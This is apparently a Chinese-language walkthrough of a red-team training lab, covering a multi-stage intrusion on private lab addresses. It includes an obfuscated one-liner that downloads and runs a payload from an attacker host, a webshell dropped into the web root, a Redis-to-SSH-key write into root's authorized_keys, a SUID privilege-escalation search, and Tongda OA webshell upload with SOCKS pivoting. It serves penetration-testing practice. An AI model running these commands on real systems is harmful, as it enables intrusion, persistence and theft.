### 启元学堂 REDV 靶场练习

#### 环境部署
- **入口点**: `http://192.168.88.101/`
- **工具**:
  - Start: 查看 README 文件即可
  - X-C2
  - 冰蝎3
  - WebAnalyzer

#### 指纹识别
- 目标站点使用的是 Hexo (版本 5.3.0)。
  ```json
  {
      "name": "Hexo",
      "version": "5.3.0",
      "detail": "regex \"Hexo(?: v?([\\d.]+))?\" match meta[generator] of http://192.168.88.101/",
      "origin": "wappalyzer"
  }
  ```

#### 目录扫描
- 扫描结果未发现有用信息。

#### 服务发现
- 在 `web1` 上的 81 端口发现了一个服务，可能是 Laravel 应用。
- 可以尝试利用 CVE-2021-3129 进行攻击。
- **提示**:
  - 攻击成功后，脚本通常会写入 `laravel.log` 文件。但在实际环境中，该路径可能不存在，需要猜测或进一步探测。
  - 使用 macOS 测试时，由于 payload 不能换行，需要加 `-w0` 参数。但 macOS 下 `-w0` 是默认设置，建议切换到 Linux 系统进行测试。
  - 如果找不到日志文件路径，可以结合 FastCGI 或 Redis 进行攻击。
  - 修改脚本以支持自定义命令执行。

#### 利用漏洞
- **中继后门**:
  ```bash
  bash=bash -c {echo,Y2QgL3RtcC8gJiYgY3VybCBodHRwOi8vMTkyLjE2OC44OC4xMDA6ODA4MS93ZWIxICAtbyBuZ2lueCAmJiBjaG1vZCAreCBuZ2lueCAmJiAuL25naW54}|{base64,-d}|{bash,-i}
  ```
- 发现目标不联网，网络环境只允许 DMZ 出网。

#### 冰蝎马植入
- 将以下代码解码并保存为 `/var/www/html/wfox_coolcat.php`:
  ```bash
  echo PD9waHAKQGVycm9yX3JlcG9ydGluZygwKTsKc2Vzc2lvbl9zdGFydCgpOwogICAk... | base64 -d > /var/www/html/wfox_coolcat.php
  ```

#### 查看 IP 地址
- 外网 IP:
  ```bash
  curl ifconfig.me
  curl -4/-6 icanhazip.com
  curl ipinfo.io/ip
  curl api.ipify.org
  curl checkip.dyndns.org
  dig +short myip.opendns.com @resolver1.opendns.com
  host myip.opendns.com resolver1.opendns.com
  curl ident.me
  curl bot.whatismyipaddress.com
  curl ipecho.net/plain
  ```
- 内网 IP:
  ```bash
  ifconfig -a
  ip addr (ip a)
  hostname -I | awk '{print $1}'
  ip route get 1.2.3.4 | awk '{print $7}'
  ```

#### Docker 逃逸
- 实际操作中遇到的问题是不知道网段信息。可以通过查看配置文件来获取更多信息。
- 这台机器是一个 Docker 容器，正常情况下应该可以利用通用方法证明漏洞存在（无回显的情况）。
- 考点是 Docker 逃逸。CDK 工具效果不佳。

#### SUID 提权
- 使用以下命令查找具有 SUID 权限的文件:
  ```bash
  find / -perm -u=s -type f 2>/dev/null
  ```
- 利用 `$PATH` 变量中的 `ps` 命令获取 root 权限。参考相关文章学习 Docker 容器逃逸和 SUID 提权。

#### CVE-2019-5736 漏洞
- 通过 Redis 未授权访问写入 SSH 公钥:
  ```bash
  (echo -e "\n\n"; cat ~/.ssh/id_rsa.pub; echo -e "\n\n") > key.txt
  cat key.txt | redis-cli -h 192.168.88.101 -x set xxx
  config set dir /root/.ssh   
  config set dbfilename authorized_keys    
  save  
  ```
- 注意：启动靶场时记得使用 `sudo` 以确保有足够的权限写入文件。

#### 信息收集
- 收集 `web1` 的网卡信息和登录信息:
  ```bash
  ifconfig
  last
  ```

#### 扫描 52 网段
- 使用 C2 起一个 SOCKS5 代理:
  ```bash
  socks5 --port 1234 --username qqq --password qqq
  ```
- 通过 Burp Suite 访问目标。

#### 通达 OA 漏洞利用
- 通过任意用户登录后台，利用文件包含漏洞上传 WebShell:
  ```bash
  http://192.168.52.30:8080/inc/expired.php
  ```
- 设置代理连接 WebShell，并生成后门上传执行。

#### 新网段发现
- 在新网段中发现 `admin` 进程，可以通过迁移或抓取密码进行进一步攻击。
- 手动测试了 TCP-Pivot，稳定性较好，可以串联攻击多层网络。

#### 结论
- 主要测试了 C2 代理的稳定性和 TCP-Pivot 功能。